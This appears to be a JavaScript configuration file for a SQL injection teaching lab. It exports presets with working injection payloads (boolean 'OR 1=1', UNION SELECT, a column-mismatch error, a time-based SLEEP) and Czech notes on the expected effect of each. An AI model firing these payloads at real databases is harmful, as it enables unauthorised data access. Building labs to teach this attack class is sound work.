export const MODE_OPTIONS = ["safe", "vuln"];
export const PATTERN_OPTIONS = ["boolean", "union", "error", "time"];
export const TARGET_OPTIONS = ["items", "variants"];

export const SQLI_PRESETS = [
  {
    id: "boolean-true",
    label: "Boolean: always true",
    mode: "vuln",
    pattern: "boolean",
    target: "variants",
    payload: "%' OR 1=1 -- ",
    note: "Očekávej změnu rowCount / dataPreview.",
  },
  {
    id: "union-basic",
    label: "UNION: basic",
    mode: "vuln",
    pattern: "union",
    target: "variants",
    payload: "%' UNION SELECT 1,2,3,4,5 -- ",
    note: "Uprav SELECT podle toho, co backend očekává pro UNION pattern.",
  },
  {
    id: "error-union-mismatch",
    label: "Error: UNION column mismatch",
    mode: "vuln",
    pattern: "error",
    target: "variants",
    payload: "%' UNION SELECT 1,2,3,4,5 -- ",
    note: "Očekávej SQL error (jiný počet sloupců než SELECT).",
  },
  {
    id: "time-sleep-2",
    label: "Time: SLEEP(2)",
    mode: "vuln",
    pattern: "time",
    target: "variants",
    payload: "%' OR IF(1=1,SLEEP(2),0) -- ",
    durationMs: 2000,
    note: "Očekávej durationMs ~ 2000+ (server).",
  },
];
